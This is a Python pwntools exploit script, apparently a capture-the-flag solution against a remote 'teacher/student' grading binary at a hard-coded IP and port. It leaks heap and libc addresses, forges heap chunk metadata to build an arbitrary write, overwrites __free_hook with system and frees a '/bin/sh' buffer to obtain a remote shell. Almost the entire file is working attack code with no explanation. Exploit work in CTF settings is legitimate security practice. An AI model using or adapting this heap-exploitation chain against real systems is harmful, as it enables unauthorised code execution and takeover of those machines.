#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "124.70.130.92 60001"
remote_service = remote_service.strip().split(" ")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
# p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    lg("p.pid")
    input()
def cmd(choice):
	ru(b'choice>> ')
	sl(str(choice).encode())

l.symbols['main_arena'] = 0x1ecb80
role = 0
def select_role(choice):
	ru(b'role: <0.teacher/1.student>: ')
	sl(str(choice).encode())
def add_student(num_ti):
	cmd(1)
	ru(b'enter the number of questions: ')
	sl(str(num_ti).encode())
def give_score():
	cmd(2)
def give_review(idx, data, size=0):
	cmd(3)
	ru(b'which one? >')
	sl(str(idx).encode())
	if size:
		ru(b'please input the size of comment:')
		sl(str(size).encode())
	ru(b'enter your comment:\n')
	sn(data)
def free_stud(idx):
	cmd(4)
	ru(b'which student id to choose?\n')
	sl(str(idx).encode())
def change_role():
	global role
	cmd(5)
	role ^= 1
	select_role(role)

def check_review():
	cmd(2)
def get_reward():
	check_review()
	ru(b'Good Job! Here is your reward! 0x')
	leak_addr = int(ru(b'\n', 'drop'), 16)
	return leak_addr
def add_one_to(addr):
	ru(b'add 1 to wherever you want! addr: ')
	sn(str(addr).encode())
	
def pray():
	cmd(3)
def change_id(idx):
	cmd(6)
	ru(b'input your id: ')
	sl(str(idx).encode())
offset1 = 0x41
offset2 = 0x49

# teacher
select_role(0)
add_student(1)		# id=0
add_student(1)		# id=1
change_role()

# student
pray()
change_id(1)
pray()
change_role()

# teacher
give_score()
give_review(0, b'aaa', 0x48)
give_review(1, b'bbb', 0x48)
change_role()

# student
## 0
change_id(0)
chunk0 = get_reward()
lg("chunk0")
add_one_to(chunk0+0x42)
change_role()

# teacher
add_student(1)		# id=2
give_review(2, b'ccc', 1023)
add_student(1)		# id=3
give_review(3, b'ddd', 1023)
# debugPID()
payload = b'a'*0x48 + p64(0x421) + (b'\x00'*0x48 + p64(0x31) + p64(chunk0+0x170) + p64(0)*4 + p64(0x21) + p64(1) + p64(chunk0+0xf0) + p64(0x10000) + p64(0x411)).ljust(0x418, b'\x00') + p64(0x91)
give_review(0, payload)
free_stud(1)
change_role()

# leak_libc
# student
## 0
change_id(2)
## 2
check_review()
ru(b"review:\n")
libc_base = uu64(rn(6)) - 96 - l.symbols['main_arena']
lg("libc_base")
change_role()

# teacher
payload = (b'/bin/sh\x00').ljust(0x48, b'\x00') + p64(0x421) + (b'\x00'*0x48 + p64(0x31) + p64(chunk0+0x170) + p64(0)*4 + p64(0x21) + p64(1) + p64(libc_base + l.symbols['__free_hook']) + p64(0x10000) + p64(0x411) + b'/bin/sh\x00').ljust(0x418, b'\x00') + p64(0x91)
give_review(0, payload)
give_review(2, p64(libc_base + l.symbols['system']))
free_stud(0)



# debugPID()
irt()